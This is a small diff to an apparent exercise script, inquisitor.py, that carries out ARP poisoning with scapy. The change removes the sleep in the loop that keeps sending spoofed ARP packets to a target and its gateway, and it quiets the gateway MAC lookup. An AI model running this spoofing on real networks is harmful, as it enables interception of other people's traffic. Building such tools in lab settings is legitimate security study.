@@ -12,10 +12,9 @@
 #                                                                              #
 # **************************************************************************** #
 
-from scapy.all import ARP, Ether, sendp, sniff, srp, Padding
+from scapy.all import ARP, Ether, sendp, srp
 import argparse
 import sys
-import time
 
 ARP_TYPE = 0x0806
 WHO_HAS = 1
@@ -73,7 +72,7 @@ def find_gateway_macaddr():
 	print("Send this request to get gateway MAC address")
 	# broadcast.show()
 	try:
-		response = srp(broadcast, timeout=2)
+		response = srp(broadcast, timeout=2, verbose=False)
 	except:
 		print("inquisitor.py: error: cannot get mac address of gateway")
 		exit(1)
@@ -87,7 +86,6 @@ def inquisitor():
 		while True:
 			sendp(target_packet, verbose=False)
 			sendp(gateway_packet, verbose=False)
-			time.sleep(2)
 	except KeyboardInterrupt :
 		print("\nEnd of arp poisonning")
 		target_restore_packet = create_arppkt(MAC_GATEWAY, IP_SRC, MAC_TARGET, IP_TARGET)
